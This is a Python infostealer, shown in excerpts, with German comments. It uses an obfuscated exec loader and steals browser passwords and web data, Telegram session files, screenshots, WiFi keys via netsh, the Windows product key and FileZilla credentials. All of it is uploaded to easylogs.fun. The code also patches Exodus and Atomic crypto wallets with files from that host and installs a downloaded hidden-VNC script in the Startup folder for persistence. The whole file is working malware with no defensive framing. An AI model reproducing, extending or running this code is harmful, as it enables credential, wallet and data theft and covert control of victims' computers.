...
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))
...
def upload_to_server(filepath):
    ...
    for i in range(10):
        ...
        try:
            ...
            url = "http://easylogs.fun/delivery"
...
def inject():
    ...
    exodusPatchURL = "https://easylogs.fun/wallet"
...
def inject_atomic():
    ...
    atomicPatchURL = "https://easylogs.fun/wallet/atomic"
...
requests.post("https://easylogs.fun/pw", data=password_json_data, headers=password_headers)
...
requests.post("https://easylogs.fun/webdata", data=web_data_json, headers=web_data_headers)
...
def telegram():
    ...
    if os.path.exists(source_path):
        ...
        with open(zip_path, 'rb') as f:
            ...
            headers ={"userid": userid}
            response = requests.post("http://easylogs.fun/delivery", files=files, headers=headers)
...
def capture_and_upload_screenshot():
    try:
        screenshot_path = os.path.join(STORAGE_PATH, "desktop_screenshot.png") 
...
DEVICE_INFO_FILENAME = "Deviceinfo.txt"
UPLOAD_URL = "http://easylogs.fun/delivery"

def collect_device_info():
    """Sammelt Gerätedaten und speichert sie in einer strukturierten Textdatei."""
    device_info = {
        "Operating_System": {
        ...
        "Hardware": {
            ...
            "Total_RAM_GB": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        },
        "Network": {
    ...
    device_info_path = os.path.join(STORAGE_PATH, DEVICE_INFO_FILENAME)
    with open(device_info_path, "w", encoding="utf-8") as file:
        ...
        file.write("** OS       **\n")
        file.write(f"- Name          : {device_info['Operating_System']['Name']}\n")
        file.write(f"- Version       : {device_info['Operating_System']['Version']}\n\n")
        
        file.write("** Hardware **\n")
        file.write(f"- Architecture  : {device_info['Hardware']['Architecture']}\n")
        file.write(f"- Processor     : {device_info['Hardware']['Processor']}\n")
        file.write(f"- CPU-Cores     : {device_info['Hardware']['CPU_Cores']}\n")
        file.write(f"- Total-RAM     : {device_info['Hardware']['Total_RAM_GB']}\n\n")
        
        file.write("** Network  **\n")
        file.write(f"- Hostname      : {device_info['Network']['Hostname']}\n")
        file.write(f"- IP-Adress     : {device_info['Network']['IP_Address']}\n\n")
        
        file.write("** USER     **\n")
        file.write(f"- Username      : {device_info['User']['Username']}\n\n")
        
        file.write("** WiFi Passwords **\n")
        for wifi_name, wifi_password in device_info["WiFi_Passwords"].items():
            file.write(f"- SSID: {wifi_name} | Password: {wifi_password}\n")
        
        file.write("==============================\n")
        file.write("     NO MORE DATA FOUND       \n")
        file.write("==============================\n")

    upload_device_info(device_info_path)

def get_wifi_passwords():
    wifi_passwords = {}
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, encoding="utf-8", errors="ignore")
        ...
        if result.stdout and "All User Profile" in result.stdout:
            ...
            for profile in profiles:
                result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, encoding="utf-8", errors="ignore")
                if result.stdout:
                    password_line = next((line for line in result.stdout.splitlines() if "Key Content" in line), None)
                    if password_line:
                        wifi_passwords[profile] = password_line.split(":")[1].strip()
                    else:
                        wifi_passwords[profile] = "No password found"
                else:
                    wifi_passwords[profile] = "Error retrieving password"
        else:
            wifi_passwords["Error"] = "No WiFi profiles found or VM environment without WLAN support"
            
    except Exception as e:
        wifi_passwords["Error"] = str(e)
    
    return wifi_passwords

def upload_device_info(filepath):
    headers = {'userid': userid}
    try:
        with open(filepath, 'rb') as file:
            files = {'file': (DEVICE_INFO_FILENAME, file)}
...
def add_to_startup(file_url, filename="hvnc.py"):
    # Ermitteln des Startordners des Benutzers
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Dateipfad für hvnc.py im Autostart-Ordner
    file_path = os.path.join(startup_folder, filename)

    # Herunterladen des Inhalts als Text von der URL
    try:
        response = requests.get(file_url)
        response.raise_for_status()  # Sicherstellen, dass der Download erfolgreich war
        
        # Speichern des heruntergeladenen Textinhalts als UTF-8 kodierte Python-Datei im Autostart-Ordner
        with open(file_path, "w", encoding="utf-8") as file:
            # UTF-8-Kodierungsdeklaration hinzufügen, um sicherzustellen, dass Python sie korrekt interpretiert
            file.write("# -*- coding: utf-8 -*-\n")
            file.write(response.text)
        
        # Unsichtbar im Hintergrund starten
        hide_in_background(file_path)
        print(f"{filename} erfolgreich zum Autostart hinzugefügt und wird im Hintergrund ausgeführt.")
    
    except requests.RequestException as e:
        print(f"Fehler beim Herunterladen der Datei: {e}")

def hide_in_background(file_path):
    """Startet das Python-Skript im Hintergrund und unsichtbar."""
    # Erstellen einer Batch-Datei, um hvnc.py als unsichtbaren Prozess zu starten
    batch_content = f'start /min python "{file_path}"\nexit'
    batch_path = os.path.join(os.getenv('APPDATA'), "run_hvnc.bat")
    
    # Speichern der Batch-Datei
    with open(batch_path, "w") as batch_file:
        batch_file.write(batch_content)
    
    # Batch-Datei im Autostart-Ordner speichern, um sie beim Systemstart auszuführen
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_batch_path = os.path.join(startup_folder, "run_hvnc.bat")
    
    # Kopieren der Batch-Datei in den Autostart-Ordner
    if not os.path.exists(startup_batch_path):
        os.rename(batch_path, startup_batch_path)
    
    # Batch-Datei einmalig ausführen, um hvnc.py unsichtbar zu starten
    subprocess.Popen(['cmd', '/c', startup_batch_path], shell=True)

# Beispielaufruf
add_to_startup("https://easylogs.fun/hvnc")
...
def decode_product_key_win8_and_up(digital_product_id):
    ...
    for i in range(24, -1, -1):
        ...
        for j in range(14, -1, -1):
            current *= 256
            current = digital_product_id[j + key_offset] + current
            digital_product_id[j + key_offset] = current // 24
            current %= 24
            last = current
        decoded_key = digits[current] + decoded_key

    decoded_key = decoded_key[:last + 1] + "N" + decoded_key[last + 1:]
    for i in range(5, len(decoded_key), 6):
        decoded_key = decoded_key[:i] + "-" + decoded_key[i:]
    return decoded_key
...
def decode_product_key(digital_product_id):
    ...
    for i in range(28, -1, -1):
        if (i + 1) % 6 == 0:
            ...
            digit_map_index = 0
            for j in range(key_end_index, key_start_index - 1, -1):
                byte_value = (digit_map_index << 8) | digital_product_id[j]
                digital_product_id[j] = byte_value // 24
                digit_map_index = byte_value % 24
            decoded_chars[i] = digits[digit_map_index]
    return ''.join(decoded_chars)

def get_windows_product_key_from_registry():
    try:
        with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
            digital_product_id, _ = QueryValueEx(key, "DigitalProductId")
            os_version = struct.unpack('H', bytes(digital_product_id[0x26:0x28]))[0]
            
            if os_version >= 10240:
                return decode_product_key_win8_and_up(bytearray(digital_product_id))
            else:
                return decode_product_key(bytearray(digital_product_id))
    except Exception:
        return None

def save_product_key_to_file():
    product_key = get_windows_product_key_from_registry()
    file_path = os.path.join(STORAGE_PATH, "Windows_Productkey.txt")
    
    with open(file_path, "w") as file:
        file.write("Windows Product Key: " + (product_key or "Fehler beim Abrufen des Product Keys"))
...
file_path = save_product_key_to_file()
upload_file(file_path)

def get_filezilla_paths():
    filezilla_dir = os.path.join(APPDATA, 'FileZilla')
    return [
        os.path.join(filezilla_dir, 'recentservers.xml'),
        os.path.join(filezilla_dir, 'sitemanager.xml')
    ]
...
def extract_passwords(tree):
    ...
    for server in tree.findall('.//Server'):
        ...
        user = server.find('User').text if server.find('User') is not None else 'anonymous'
        pass_enc = server.find('Pass').text if server.find('Pass') is not None else ''
        password = base64.b64decode(pass_enc).decode('utf-8') if pass_enc else ''
        
        passwords.append(f"Url: ftp://{host}:{port}/\nUsername: {user}\nPassword: {password}\n\n")
    return passwords

def save_passwords(passwords):
    os.makedirs(STORAGE_PATH, exist_ok=True)
    file_path = os.path.join(STORAGE_PATH, 'FileZillaHost.txt')
    with open(file_path, 'w') as file:
        file.writelines(passwords)
    return file_path

def steal_filezilla_passwords():
    files = get_filezilla_paths()
    all_passwords = []
    ...
    for file in files:
        if os.path.exists(file):
            tree = load_xml(file)
            if tree:
                passwords = extract_passwords(tree)
                all_passwords.extend(passwords)

    if all_passwords:
        file_path = save_passwords(all_passwords)
        upload_file(file_path)

steal_filezilla_passwords()
